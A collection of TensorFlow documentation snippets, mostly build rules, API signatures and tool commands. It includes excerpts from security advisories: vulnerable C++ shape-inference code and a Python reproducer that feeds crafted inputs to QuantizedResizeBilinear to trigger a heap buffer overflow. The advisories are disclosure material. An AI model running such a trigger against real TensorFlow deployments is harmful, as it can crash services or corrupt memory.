DESCRIPTION: This C++ snippet from the `LoadAndRemapMatrix` kernel implementation shows where the input tensor `row_remapping` is accessed as a vector (`->vec<int64_t>()`). The vulnerability arises because similar access for `initializing_values` lacks proper shape validation, assuming it can always be treated as a vector, which is not guaranteed by the operation's input checks in vulnerable versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-067.md#_snippet_1

LANGUAGE: c++
CODE:
```
OP_REQUIRES_OK(context, context->input("row_remapping", &row_remapping_t));
const auto row_remapping = row_remapping_t->vec<int64_t>();
```

----------------------------------------

TITLE: Problematic Cudnn* Shape Inference Logic (C++)
DESCRIPTION: This C++ snippet shows the vulnerable code within the TensorFlow `Cudnn*` operation's shape inference. It retrieves the shapes of the first two inputs (`input_shape` and `input_h_shape`) and then attempts to extract dimensions (`batch_size` and `num_units`) assuming `input_shape` has rank >= 2 and `input_h_shape` has rank >= 3, without explicit validation. This assumption is the root cause of the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-174.md#_snippet_1

LANGUAGE: cpp
CODE:
```
auto input_shape = c->input(0);
auto input_h_shape = c->input(1);
auto seq_length = c->Dim(input_shape, 0);
auto batch_size = c->Dim(input_shape, 1);  // assumes rank >= 2
auto num_units = c->Dim(input_h_shape, 2); // assumes rank >= 3
```

----------------------------------------

TITLE: Building MLIR Library (StablehloExtensionBase) - CMake
DESCRIPTION: This CMake command defines a target for building a base MLIR library named `StablehloExtensionBase`. It specifies `base.cpp` as a source file and declares a public linkage dependency on the `MLIRIR` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/IR/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
add_mlir_library(StablehloExtensionBase
  PARTIAL_SOURCES_INTENDED
  base.cpp

  LINK_LIBS PUBLIC
  MLIRIR
)
```

----------------------------------------

TITLE: Discovering Google Tests (CMake)
DESCRIPTION: Includes the standard GoogleTest module and uses the `gtest_discover_tests` command to find and register all Google Test cases within the `aot_compiled_test` executable. This makes the tests available for execution via CMake's testing tools (ctest).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
include(GoogleTest)
gtest_discover_tests(aot_compiled_test)
```

----------------------------------------

TITLE: Copying TFLite External Delegate Shared Library (Shell)
DESCRIPTION: This command copies the built external delegate shared library (`.so`) from the Bazel output directory to a temporary location (`/tmp`) where it can be loaded by the TFLite tools at runtime.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_5

LANGUAGE: Shell
CODE:
```
cp bazel-bin/tensorflow/lite/delegates/utils/dummy_delegate/dummy_external_delegate.so /tmp
```

----------------------------------------

TITLE: Defining TFLite Shared Object Target - Bazel
DESCRIPTION: This Bazel build rule defines the target for building the TensorFlow Lite C++ shared library. It includes platform-specific link options for macOS, Windows, and default (Linux/Android), along with dependencies required for the build.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_7

LANGUAGE: Bazel
CODE:
```
tflite_cc_shared_object(
    name = "tensorflowlite",
    # Until we have more granular symbol export for the C++ API on Windows,
    # export all symbols.
    features = ["windows_export_all_symbols"],
    linkopts = select({
        "//tensorflow:macos": [
            "-Wl,-exported_symbols_list,$(location //tensorflow/lite:tflite_exported_symbols.lds)",
        ],
        "//tensorflow:windows": [],
        "//conditions:default": [
            "-Wl,-z,defs",
            "-Wl,--version-script,$(location //tensorflow/lite:tflite_version_script.lds)",
        ],
    }),
    per_os_targets = True,
    deps = [
        ":selectively_built_cc_lib",
        "//tensorflow/lite:tflite_exported_symbols.lds",
        "//tensorflow/lite:tflite_version_script.lds",
    ],
)
```

----------------------------------------

TITLE: Import Image Classifier Metadata Packages (Python)
DESCRIPTION: This snippet imports the necessary Python packages from the tflite_support library for working with image classifier metadata. It specifically imports the `image_classifier` module for the writer and `writer_utils` for utility functions like loading and saving files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
from tflite_support.metadata_writers import image_classifier
from tflite_support.metadata_writers import writer_utils
```

----------------------------------------

TITLE: Setting Hermetic CUDA/CUDNN/Compute Capabilities in .bazelrc
DESCRIPTION: Shows how to define the specific versions of hermetic CUDA, CUDNN, and the desired CUDA compute capabilities within the `.bazelrc` file, typically under the `:cuda` build configuration. This ensures these versions and capabilities are used consistently when the `--config=cuda` flag is passed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_2

LANGUAGE: Bazel config
CODE:
```
build:cuda --repo_env=HERMETIC_CUDA_VERSION="12.6.3"
build:cuda --repo_env=HERMETIC_CUDNN_VERSION="9.3.0"
build:cuda --repo_env=HERMETIC_CUDA_COMPUTE_CAPABILITIES="sm_50,sm_60,sm_70,sm_80,compute_90"
```

----------------------------------------

TITLE: Demonstrating Multiline Lambda Parsing Issue (Pre-TF 2.3) Python
DESCRIPTION: Shows a lambda function declaration split across multiple lines using parentheses. In older TensorFlow versions (pre-TF 2.3), `inspect.getsource` might only capture part of the function body, leading to parsing errors for AutoGraph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_53

LANGUAGE: Python
CODE:
```
foo = (
    lambda y: lambda x: x * y
    - y
)
```

----------------------------------------

TITLE: Building MLIR ChloPasses Library (CMake)
DESCRIPTION: Defines a CMake target for the ChloPasses library. This library contains MLIR passes for the CHLO dialect, primarily focusing on legalizing CHLO operations to MHLO, including the source file and various MLIR dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_10

LANGUAGE: CMake
CODE:
```
add_mlir_library(ChloPasses
  chlo_legalize_to_hlo/chlo_legalize_to_hlo_pass.cc

  DEPENDS
  MLIRhlo_opsIncGen
  MLIRChloLegalizeToHloIncGen
  MLIRMhloPassIncGen
  PassesIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  ChloOps
  HloToLinalgUtils
  MLIRComplexDialect
  MLIRIR
  MLIRPass
  MLIRRewrite
  MLIRTransformUtils
)
```

----------------------------------------

TITLE: Instantiating BoundingBoxPropertiesT - Python
DESCRIPTION: Documents the constructor for the `BoundingBoxPropertiesT` class, used to create new instances representing bounding box properties in TFLite metadata. It typically initializes an empty object ready to be populated with data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BoundingBoxPropertiesT()
```

----------------------------------------

TITLE: Adding ProcessUnit Options Type using FlatBuffers Builder - Python
DESCRIPTION: This function, likely a constructor or helper from the generated TFLite metadata schema code, is used to specify or add the type of options associated with a `ProcessUnit` when building a FlatBuffers buffer. It takes a FlatBuffers `builder` instance and the `optionsType` value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitAddOptionsType.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ProcessUnitAddOptionsType(
    builder, optionsType
)
```

----------------------------------------

TITLE: Initializing EfficientNet-Lite4 Spec - Python
DESCRIPTION: This Python snippet shows the constructor signature for `EfficientNetLite4Spec`. It's used to define the configuration for an EfficientNet-Lite4 model, including the pretrained model URI, compatible TensorFlow versions, input image dimensions, and a name for the spec.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/EfficientNetLite4Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.image_classifier.EfficientNetLite4Spec(\n    *,\n    uri='https://tfhub.dev/tensorflow/efficientnet/lite4/feature-vector/2',\n    compat_tf_versions=[1, 2],\n    input_image_shape=[300, 300],\n    name='efficientnet_lite4'\n)
```

----------------------------------------

TITLE: Getting Default Quantization Config Python
DESCRIPTION: This method within the `ModelSpec` class retrieves the default configuration settings suitable for quantizing the recommendation model. It provides a standard setup that can be used or modified for optimizing the model size and performance for TFLite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/ModelSpec.md#_snippet_2

LANGUAGE: python
CODE:
```
get_default_quantization_config()
```

----------------------------------------

TITLE: Run Cross-compiled Unit Tests (CTest External Delegate)
DESCRIPTION: Launches cross-compiled TensorFlow Lite unit tests using an external delegate via the CTest utility on the target. The `TESTS_ARGUMENTS` environment variable is used to provide the path to the external delegate shared library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_15

LANGUAGE: sh
CODE:
```
cmake -E env TESTS_ARGUMENTS=--external_delegate_path=<PATH> ctest -L delegate
```

----------------------------------------

TITLE: Define Build Directories and Check Target
DESCRIPTION: Sets various CMake variables pointing to key source and binary directories within the MLIR-HLO build tree. It also defines a custom target 'check-mlir-hlo' which can be used for running tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_14

LANGUAGE: CMake
CODE:
```
#-------------------------------------------------------------------------------
# Directory setup
#-------------------------------------------------------------------------------

set(MLIR_HLO_SOURCE_DIR ${CMAKE_CURRENT_SOURCE_DIR})
set(MLIR_HLO_BINARY_DIR ${CMAKE_CURRENT_BINARY_DIR})
set(MLIR_HLO_MAIN_INCLUDE_DIR ${MLIR_HLO_SOURCE_DIR})
set(MLIR_HLO_GEN_INCLUDE_DIR ${MLIR_HLO_BINARY_DIR})
set(MLIR_HLO_TOOLS_DIR ${MLIR_HLO_BINARY_DIR}/bin)
set(MLIR_HLO_LIB_DIR ${MLIR_HLO_BINARY_DIR}/lib)
add_custom_target(check-mlir-hlo)
```

----------------------------------------

TITLE: Checking for Null Vocab File Python
DESCRIPTION: This instance method checks if the vocabulary file data field is null or not present in the flatbuffer object. It returns a boolean value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_8

LANGUAGE: python
CODE:
```
VocabFileIsNone()
```

----------------------------------------

TITLE: Convert HLO Text to HLO Proto
DESCRIPTION: This command uses `hlo-opt` with the `--emit-proto` flag to convert an input HLO module in text format (`input.hlo`) into its protobuf representation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_21

LANGUAGE: Command Line
CODE:
```
hlo-opt --emit-proto input.hlo
```

----------------------------------------

TITLE: Creating TFLite Multihead Audio Classifier MetadataWriter from Info Objects (Python)
DESCRIPTION: This class method specifically creates a `MetadataWriter` for audio classification models with multiple output heads (multihead models). It uses structured information objects for general, input, and a list of output tensors, generating default metadata if not provided, and returns a `MetadataWriter`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata_info_for_multihead(
    model_buffer: bytearray,
    general_md: Optional[tflite_support.metadata_writers.metadata_info.GeneralMd] = None,
    input_md: Optional[tflite_support.metadata_writers.metadata_info.InputAudioTensorMd] = None,
    output_md_list: Optional[List[metadata_info.ClassificationTensorMd]] = None
)
```

----------------------------------------

TITLE: Appending DataLoader Dataset Python
DESCRIPTION: Appends the dataset from another DataLoader instance to the current one. Users are responsible for ensuring that the embedders used by both DataLoaders are identical.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ImageDataLoader.md#_snippet_3

LANGUAGE: python
CODE:
```
append(
    data_loader: 'DataLoader'
) -> None
```

----------------------------------------

TITLE: Setting Dynamic Dimension Size in XLA HLO
DESCRIPTION: Demonstrates how to set the dynamic size of a dimension on an XlaOp using `set_dimension_size`. The dynamic size affects operations like reduction, as shown by the differing results of `reduce_sum` and `reduce_product` when the dynamic size changes. The static shape remains unchanged.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_22

LANGUAGE: XLA HLO / C++-like
CODE:
```
let v: f32[10] = f32[10]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
let five: s32 = 5;
let six: s32 = 6;

// Setting dynamic dimension size doesn't change the upper bound of the static
// shape.
let padded_v_five: f32[10] = set_dimension_size(v, five, /*dimension=*/0);
let padded_v_six: f32[10] = set_dimension_size(v, six, /*dimension=*/0);

// sum == 1 + 2 + 3 + 4 + 5
let sum:f32[] = reduce_sum(padded_v_five);
// product == 1 * 2 * 3 * 4 * 5
let product:f32[] = reduce_product(padded_v_five);

// Changing padding size will yield different result.
// sum == 1 + 2 + 3 + 4 + 5 + 6
let sum:f32[] = reduce_sum(padded_v_six);
```

----------------------------------------

TITLE: Check if Vocabulary File is None Python
DESCRIPTION: Checks if the vocabulary file list associated with the `BertTokenizerOptions` is null or empty.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptions.md#_snippet_5

LANGUAGE: python
CODE:
```
VocabFileIsNone()
```

----------------------------------------

TITLE: Initializing ContentEnd in Python
DESCRIPTION: This snippet displays the Python signature for initializing or constructing a `ContentEnd` object or calling the `ContentEnd` function. It requires a single argument, `builder`, which is likely an object used for constructing or serializing data within the metadata schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ContentEnd(
    builder
)
```

----------------------------------------

TITLE: Defining All MHLO Passes Interface Library (CMake)
DESCRIPTION: Defines a CMake INTERFACE library target named AllMhloPasses. This target is used to group and export dependencies on several individual MHLO/CHLO/StableHLO related libraries, providing a convenient way for other targets to link against all of them simultaneously.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_14

LANGUAGE: CMake
CODE:
```
add_library(AllMhloPasses INTERFACE)
target_link_libraries(AllMhloPasses INTERFACE
  ChloPasses
  MhloPasses
  MhloToArithmeticConversion
  MhloToMemrefConversion
  HloToLinalgUtils
  MhloToLinalg
  MhloToStablehlo
  StablehloToMhlo
)
```

----------------------------------------

TITLE: Build and Push Benchmark Model Tool - Android Bash
DESCRIPTION: Builds the TensorFlow Lite `benchmark_model` executable for Android ARM64 using Bazel and then pushes the compiled binary to the `/data/local/tmp` directory on the connected Android device using ADB. This tool is used to measure the performance of a TF Lite model, optionally leveraging a delegate.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_12

LANGUAGE: bash
CODE:
```
bazel build -c opt --config=android_arm64 //tensorflow/lite/tools/benchmark:benchmark_model

adb push "$(bazel info -c opt --config=android_arm64 bazel-bin)"/tensorflow/lite/tools/benchmark/benchmark_model /data/local/tmp
```

----------------------------------------

TITLE: Run Cross-compiled Unit Tests (CTest XNNPACK Delegate)
DESCRIPTION: Launches cross-compiled TensorFlow Lite unit tests using the XNNPACK delegate via the CTest utility on the target. The `TESTS_ARGUMENTS` environment variable passes delegate-specific configuration flags to the test executables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_14

LANGUAGE: sh
CODE:
```
cmake -E env TESTS_ARGUMENTS=--use_xnnpack=true ctest -L delegate
```

----------------------------------------

TITLE: Loading Test Data - Python
DESCRIPTION: Loads the test dataset using the `load_pose_landmarks` function. This data (`X_test`, `y_test`) will be used later to evaluate the final trained model's performance on unseen examples, and the original DataFrame (`df_test`) is kept for potential analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
# Load the test data
X_test, y_test, _, df_test = load_pose_landmarks(csvs_out_test_path)
```

----------------------------------------

TITLE: Optimizing Bazel Build Configuration for TensorFlow - Bazelrc
DESCRIPTION: This .bazelrc configuration snippet provides optimized settings for building TensorFlow with Bazel, specifically tailored for high-core count machines. It includes startup options to adjust JVM memory settings, build options to control parallelism, resource limits, specify the clang toolchain, disable certain checks, and apply compiler flags for native architecture optimization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/tools/toolchains/clang6/README.md#_snippet_1

LANGUAGE: bazelrc
CODE:
```
startup --host_jvm_args=-Xmx30G
startup --host_jvm_args=-Xms30G
startup --host_jvm_args=-XX:MaxNewSize=3g
startup --host_jvm_args=-XX:-UseAdaptiveSizePolicy
startup --host_jvm_args=-XX:+UseConcMarkSweepGC
startup --host_jvm_args=-XX:TargetSurvivorRatio=70
startup --host_jvm_args=-XX:SurvivorRatio=6
startup --host_jvm_args=-XX:+UseCMSInitiatingOccupancyOnly
startup --host_jvm_args=-XX:CMSFullGCsBeforeCompaction=1
startup --host_jvm_args=-XX:CMSInitiatingOccupancyFraction=75

build --jobs=100
build --local_resources=200000,100,100
build --crosstool_top=@local_config_clang6//clang6
build --noexperimental_check_output_files
build --nostamp
build --config=opt
build --noexperimental_check_output_files
build --copt=-march=native
build --host_copt=-march=native
```

----------------------------------------

TITLE: Running MLIR-HLO Tests with Ninja - Bash
DESCRIPTION: Executes the `check-mlir-hlo` target using Ninja within the build directory. This command compiles the project and runs the integrated tests to verify the build was successful and the project is functioning correctly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/README.md#_snippet_4

LANGUAGE: Bash
CODE:
```
ninja check-mlir-hlo
```

----------------------------------------

TITLE: Run run_hlo_module with Bazel
DESCRIPTION: This command shows the standard way to execute the `run_hlo_module` tool using Bazel. The tool takes an HLO filename as input and can be configured with various flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_1

LANGUAGE: Bazel
CODE:
```
bazel run //xla/tools:run_hlo_module -- [flags] <filename>
```

----------------------------------------

TITLE: Configuring RNN Units Python
DESCRIPTION: This snippet defines a variable specifying the number of recurrent units to be used in the GRU layer of the custom RNN model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
rnn_units = 1024
```

----------------------------------------

TITLE: Initializing Libraries and TensorFlow Version (Python)
DESCRIPTION: Imports key libraries (`matplotlib.pyplot`, `numpy`, `tensorflow`) required for the tutorial. It also prints the version of TensorFlow being used, which is relevant for API compatibility as on-device training features are version-dependent.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
import matplotlib.pyplot as plt
import numpy as np
import tensorflow as tf

print("TensorFlow version:", tf.__version__)
```

----------------------------------------

TITLE: Checking for Associated Files Metadata in Python
DESCRIPTION: Checks if the associated files metadata field is present or null within the schema. This method is useful for determining if associated files exist before attempting to access them.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_1

LANGUAGE: python
CODE:
```
AssociatedFilesIsNone()
```

----------------------------------------

TITLE: Initializing CategoricalSlot Class in Python
DESCRIPTION: This snippet shows the constructor signature for the `CategoricalSlot` class. It requires a string `slot` name and a `tflite_support.task.processor.Category` object representing the predicted class to create an instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/CategoricalSlot.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.CategoricalSlot(
    slot: str,
    prediction: tflite_support.task.processor.Category
)
```

----------------------------------------

TITLE: Cloning LLVM/MLIR Repository - Bash
DESCRIPTION: Clones the LLVM/MLIR GitHub repository, which is a required dependency for building MLIR-HLO. The repository will be cloned into a subdirectory named `llvm-project`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/README.md#_snippet_0

LANGUAGE: Bash
CODE:
```
git clone https://github.com/llvm/llvm-project.git
```

----------------------------------------

TITLE: Triggering QuantizedResizeBilinear Vulnerability - Python
DESCRIPTION: This Python code snippet demonstrates how to call the vulnerable `tf.raw_ops.QuantizedResizeBilinear` operation with specific input tensor values (`images`, `size`, `min`, `max`) and arguments (`align_corners`, `half_pixel_centers`) that can trigger the heap buffer overflow described in the vulnerability report. It provides a minimal example to reproduce the issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-019.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

l = [256, 328, 361, 17, 361, 361, 361, 361, 361, 361, 361, 361, 361, 361, 384]
images = tf.constant(l, shape=[1, 1, 15, 1], dtype=tf.qint32)
size = tf.constant([12, 6], shape=[2], dtype=tf.int32)
min = tf.constant(80.22522735595703)
max = tf.constant(80.39215850830078)

tf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max,
                                   align_corners=True, half_pixel_centers=True)
```

----------------------------------------

TITLE: Initializing From Buffer in TFLite Metadata (Python)
DESCRIPTION: A class method to initialize a `SubGraphMetadataT` object directly from a FlatBuffers buffer. This method is used to deserialize data representing subgraph metadata from a byte buffer at a specific position, allowing reconstruction of the Python object from its binary representation. Requires the buffer and starting position.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataT.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Implementing Python Splitter Classes
DESCRIPTION: Provides Python implementations for `ModelConfigSplitter` and `LayerSplitter` by subclassing `ComposableSplitter`, showing how to override `build_chunks` to define chunking logic for specific protobuf messages.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/g3doc/in-depth-guide.md#_snippet_2

LANGUAGE: python
CODE:
```
class ModelConfigSplitter(ComposableSplitter):
  def build_chunks(self):
    for k, v in self._proto.hyperparameters:
      self.add_chunk(bytes(str(v), "utf-8"), ["hyperparameters", k])

    for i, layer in enumerate(self._proto.hidden_layers):
      LayerSplitter(
        layer,
        parent_splitter=self,
        fields_in_parent=["hidden_layers", i]
      ).build_chunks()

class LayerSplitter(ComposableSplitter):
  def build_chunks(self):
    self.add_chunk(self._proto, [])

ModelConfigSplitter(
  proto=ModelConfig(...)
)
```

----------------------------------------

TITLE: Saved Model Conversion Flag in AverageWordVecSpec
DESCRIPTION: Boolean flag indicating whether conversion from a TensorFlow 2 SavedModel is supported for this model specification. This affects the export and conversion pipeline.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_16

LANGUAGE: python
CODE:
```
False
```

----------------------------------------

TITLE: Creating EfficientNet-Lite1 Model Specification in Python
DESCRIPTION: This snippet shows the constructor for the `EfficientNetLite1Spec` class used in TensorFlow Lite Model Maker. It initializes a specification for the EfficientNet-Lite1 image classification model. Key parameters include `uri` for the pretrained model location, `compat_tf_versions` indicating supported TensorFlow versions, `input_image_shape` for the expected image dimensions, and `name` for the spec identifier.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/EfficientNetLite1Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.image_classifier.EfficientNetLite1Spec(
    *,
    uri='https://tfhub.dev/tensorflow/efficientnet/lite1/feature-vector/2',
    compat_tf_versions=[1, 2],
    input_image_shape=[240, 240],
    name='efficientnet_lite1'
)
```

----------------------------------------

TITLE: Transformed TPU Training Loop MLIR with Resharding
DESCRIPTION: This MLIR snippet displays the training loop after the `-tf-tpu-variable-runtime-reformatting` pass has been applied. The pass has introduced state variables (`%state_var0`, `%state_var1`) into the loop signature and replication block and inserted `tf.TPUReshardVariablesOp` calls. These new operations use the state variables to track the variable formatting and conditionally reformat variables based on the desired format determined during compilation, avoiding redundant reformatting within the loop. A final `tf.TPUReshardVariablesOp` is added after the loop to restore the default format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_74

LANGUAGE: MLIR
CODE:
```
  %var0 = ...
  %var1 = ...
  %state_var0 = ...
  %state_var1 = ...
  tf.while (..., %var0, %var1, %state_var0, %state_var1) {
    tf_device.replicate ([%var0, %var1] as %rvar,
                         [%state_var0, %state_var1] as %rstate) {
      %compile:2 = "tf._TPUCompileMlir"()
      tf.TPUReshardVariablesOp(%rvar, %compile#1, %rstate)
      tf.TPUExecuteAndUpdateVariablesOp(%rvar, compile#1)
    }
  }
  %default_format = tf.constant()
  tf_device.replicate ([%var0, %var1] as %rvar,
                       [%state_var0, %state_var1] as %rstate) {
    tf.TPUReshardVariablesOp(%rvar, %default_format, %rstate)
  }
```

----------------------------------------

TITLE: Transforming Python List Append with AutoGraph
DESCRIPTION: Demonstrates how a Python list append operation (`l.append(x)`) is transformed into an assignment using the `ag__.list_append` operator. This allows AutoGraph to potentially dispatch to TensorFlow-specific list/tensor list operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_6

LANGUAGE: Python
CODE:
```
l.append(x)
```

LANGUAGE: Python
CODE:
```
l = ag__.list_append(l, x)
```

----------------------------------------

TITLE: Perform Deviceless Compilation with hlo-opt
DESCRIPTION: This command shows how to use `hlo-opt` for compiling HLO for CUDA without requiring a physical GPU device. It uses the `--xla_gpu_target_config_filename` flag to provide GPU specifications from a file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_9

LANGUAGE: Command Line
CODE:
```
hlo-opt  --platform=CUDA --stage=llvm  --xla_gpu_target_config_filename=/xla/tools/hlo_opt/gpu_specs/a100_pcie_80.txtpb input.hlo
```

----------------------------------------

TITLE: Running x86 Tests with Bazel - Shell
DESCRIPTION: Provides the shell command to build and run the C++ tests for a specific operation on an x86 platform using Bazel. It specifies optimized mode and disables dynamic linking.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_7

LANGUAGE: Shell
CODE:
```
bazel test -c opt --dynamic_mode=off ops:op_name_test
```

----------------------------------------

TITLE: Get Process Units Count - TensorMetadata (Python)
DESCRIPTION: Returns the number of process units associated with this tensor metadata entry. This count is useful for iterating through the list of process units.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_14

LANGUAGE: python
CODE:
```
ProcessUnitsLength()
```

----------------------------------------

TITLE: Installing Required Python Packages
DESCRIPTION: Installs the `tf-nightly` package for the latest TensorFlow development build and `keras-core` which is needed for the ResNet50 model used in the example. These are necessary dependencies for the conversion process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/quantization/stablehlo/python/integration_test/stablehlo_quantizer_odml_oss.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
!pip3 install tf-nightly
!pip3 install keras-core
```

----------------------------------------

TITLE: Initializing BertCluAnnotator Class (Python)
DESCRIPTION: Documents the constructor of the `BertCluAnnotator` class in Python. It is typically instantiated with an options object and an internal C++ annotator instance. Users usually don't call this directly but use class methods like `create_from_file` or `create_from_options`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertCluAnnotator.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.BertCluAnnotator(\n    options: tflite_support.task.text.BertCluAnnotatorOptions,\n    cpp_annotator: _CppBertCluAnnotator\n) -> None
```

----------------------------------------

TITLE: Verify Unsigned Integer Division Optimization - LLVM IR
DESCRIPTION: This LLVM IR snippet provides the test case for verifying the safety of removing upcast/downcast around an unsigned integer division (`udiv`). Using the Alive2 tool, it compares a source function that zero-extends (`zext`), performs the division, and truncates (`trunc`) with a target function performing the division directly. This verification indicates the transformation is safe for unsigned division, unlike signed division. Input: two i8 unsigned integers. Output: an i8 unsigned integer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/service/algebraic_simplifier_alive2_proofs.md#_snippet_1

LANGUAGE: LLVM IR
CODE:
```
define i8 @src(i8, i8) {
  %cast1 = zext i8 %0 to i16
  %cast2 = zext i8 %1 to i16
  %sum = udiv i16 %cast1, %cast2
  %trunc = trunc i16 %sum to i8
  ret i8 %trunc
}

define i8 @tgt(i8, i8) {
  %r = udiv i8 %0, %1
  ret i8 %r
}
```

----------------------------------------

TITLE: Executing Benchmark Model with Sample Delegate on Linux Host (Bash)
